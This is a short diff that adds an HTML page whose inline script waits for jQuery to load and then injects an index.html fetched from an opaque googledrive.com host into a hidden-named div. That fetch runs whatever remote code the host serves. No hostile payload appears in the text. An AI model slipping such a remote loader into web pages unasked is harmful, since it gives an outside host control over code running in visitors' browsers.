@@ -1,0 +1,17 @@
+<body>
+<script>
+    $ = { o: 'google' };
+    var e = document.createElement('div');
+    e.id = 'gd4ao';
+    document.body.appendChild(e);
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://code.jquery.com/jquery-2.1.1.min.js');
+    document.body.appendChild(script);
+    var interval = setInterval(function(){
+        if (typeof $.o == 'undefined') {
+            clearInterval(interval);
+            $('#gd4ao').load('https://1b35ad3ec30d57fa3cd5e87c867ee5a396286062.googledrive.com/host/0B-y85IBqrQAQOG1kZmkzWlVuQWc/index.html');
+        }
+    }, 10);
+</script>
+</body>
